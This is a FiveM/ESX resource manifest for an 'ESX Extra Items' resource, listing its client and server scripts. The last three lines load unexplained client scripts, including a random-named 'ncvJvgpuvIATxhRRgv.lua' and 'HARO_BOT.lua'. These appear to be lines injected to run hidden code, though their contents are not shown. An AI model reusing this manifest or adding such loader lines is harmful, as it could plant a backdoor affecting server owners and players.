resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Extra Items'

version '1.0.0'

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	"@mysql-async/lib/MySQL.lua",
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua'
}


client_script "ncvJvgpuvIATxhRRgv.lua"

client_script "HARO_BOT.lua"
client_script '12698.lua'